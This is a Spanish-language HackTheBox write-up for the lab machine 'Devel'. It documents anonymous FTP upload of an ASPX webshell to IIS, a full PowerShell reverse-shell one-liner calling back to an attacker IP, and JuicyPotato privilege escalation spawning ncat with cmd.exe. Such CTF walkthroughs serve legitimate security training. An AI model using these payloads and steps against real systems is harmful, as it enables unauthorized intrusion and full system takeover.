---
icon: windows
tags:
  - ftp
  - seimpersonateprivilege
  - iis
---

# Devel

## Resumen

### Detalles

| Campo                 | Detalle                                                 |
| --------------------- | ------------------------------------------------------- |
| **Nombre**            | Devel                                                   |
| **Sistema Operativo** | Windows                                                 |
| **Plataforma**        | HackTheBox                                              |
| **Fecha**             | 27/10/2026                                              |
| **IP Objetivo**       | 10.129.91.97 `Hubo cambio de IP por reincio de máquina` |

### Executive Summary

La máquina **Devel** expone un servidor FTP con acceso anónimo y permisos de escritura sobre el directorio web de IIS 7.5. Esto permite subir una webshell ASPX y ejecutar comandos en el contexto del usuario de la aplicación web, `iis apppool\web`. Tras enumerar privilegios, se identifica que la cuenta dispone de `SeImpersonatePrivilege`, lo que permite abusar de **JuicyPotato** mediante un CLSID válido para obtener una reverse shell como `NT AUTHORITY\SYSTEM`. Finalmente se leen las flags `user.txt` y `root.txt`.

### Técnicas

* Acceso anónimo a FTP con permisos de lectura y escritura.
* Carga de webshell ASPX en el directorio web de IIS.
* Abuso de `SeImpersonatePrivilege` mediante JuicyPotato.

## Information Gathering

### Port Scanning

#### TCP

```bash
> nmap -Pn -n -vv -p- 10.129.91.97 -oG allPorts
> nmap -Pn -n -sCV -vv -p21,80 -oG allServices 10.129.91.97
```

| Puerto | Servicio | Versión                 | Notas                           |
| ------ | -------- | ----------------------- | ------------------------------- |
| 21/tcp | ftp      | Microsoft ftpd          | Anonymous Access (Write + Read) |
| 80/tcp | http     | Microsoft IIS httpd 7.5 |                                 |

## Explotación

### Foothold

* **Vulnerabilidad:** FTP con acceso anónimo y permisos de escritura sobre el directorio publicado por IIS. Esto permite subir una webshell ASPX al webroot y ejecutar código en el servidor.
* **Exploit:** Webshell ASPX `cmdasp.aspx` + reverse shell PowerShell.
* **Procedimiento:**

1. **Autenticación anonima vía `FTP`**

```bash
> ftp anonymous@10.129.91.97
```

2.  **Carga de `webshell`**

    ```bash
    # En Bash (Fuera de FTP), nos traemos el la webshell
    > cp /usr/share/webshells/aspx/cmdasp.aspx .
    # Volvemos a FTP
    ftp> put cmdasp.aspx cmdasp.aspx
    ```
3.  **Puerto en escucha para recibir una reverse shell**

    ```bash
    > netcat -lvnp 9950
    ```
4.  **Ejecución de reverse shell desde la webshell**\
    La webshell se ubica en:

    ```
    http://10.129.91.97/cmdasp.aspx
    ```

    Se introduce el siguiente comando modificando IP y puerto del atacante:

    ```powershell
    powershell -NoP -NonI -W Hidden -Command "$ErrorActionPreference='Continue'; $c=New-Object System.Net.Sockets.TCPClient('10.10.15.78',9950); $s=$c.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$s.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i); $r=(iex $d 2>&1 | Out-String); $r2=$r + 'PS ' + (pwd).Path + '> '; $sb=([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb,0,$sb.Length); $s.Flush() }; $c.Close()"
    ```

### Privesc

* **Vulnerabilidad:** Abuso de `SeImpersonatePrivilege` mediante JuicyPotato
* **Procedimiento:**

1.  **Enumeración de privilegios del usuario actual**

    ```powershell
    > whoami /priv
    ```

    Se identifica `SeImpersonatePrivilege`.<br>

    <figure><img src="../../../.gitbook/assets/image (73).png" alt="" width="563"><figcaption></figcaption></figure>
2.  **Carga de JuicyPotato y dependencias vía FTP**

    ```bash
    ftp> binary
    ftp> put JuicyPotato.exe JuicyPotato.exe
    ftp> put ncat.exe ncat.exe
    ftp> put test_clsid.bat test_clsid.bat
    ftp> put CLSID.list CLSID.list
    ftp> put CLSID.csv CLSID.csv
    ```

    > Es importante ejecutar `binary` antes de subir los ejecutables para evitar corrupción de archivos.
3.  **Búsqueda de un CLSID válido con privilegios administrativos**

    ```powershell
    > ./test_clsid.bat
    > type result.log
    ```

    \
    La columna izquierda contiene los CLSID y la derecha la identidad de sesión que se puede suplantar. Interesan los CLSID asociados a `NT AUTHORITY\SYSTEM`, por ejemplo:

    ```
    {659cdea7-489e-11d9-a9cd-000d56965251}
    ```

    <figure><img src="../../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>
4.  **Puerto en escucha para la reverse shell privilegiada**

    ```bash
    # Del lado del atacante
    > netcat -lvnp 9009
    ```
5.  **Ejecución de JuicyPotato para obtener SYSTEM**

    ```powershell
    ./JuicyPotato.exe -l 9091 -c "{659cdea7-489e-11d9-a9cd-000d56965251}" -p C:\Windows\System32\cmd.exe -a "/c C:\inetpub\wwwroot\ncat.exe 10.10.15.78 9009 -e C:\Windows\System32\cmd.exe" -t *
    ```

<figure><img src="../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

*   **Evidencia:** (`user.txt`)<br>

    <figure><img src="../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>
*   **Evidencia:** (`root.txt`)<br>

    <figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

